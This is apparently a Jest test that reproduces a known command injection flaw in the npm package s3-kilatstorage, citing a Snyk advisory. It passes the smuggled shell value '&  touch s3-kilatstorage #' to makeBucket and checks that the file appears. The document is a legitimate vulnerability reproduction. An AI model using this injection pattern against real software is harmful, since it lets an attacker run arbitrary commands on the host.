//https://snyk.io/vuln/SNYK-JS-S3KILATSTORAGE-1050396
test("Command Injection in s3-kilatstorage", () => 
{
	const a = require("s3-kilatstorage");
	const fs = require('fs');
	const path = './s3-kilatstorage';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	try
	{
		a.makeBucket("&  touch s3-kilatstorage #");
	}
	catch(error)
	{
		console.log("syntax error");
	}
		
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});

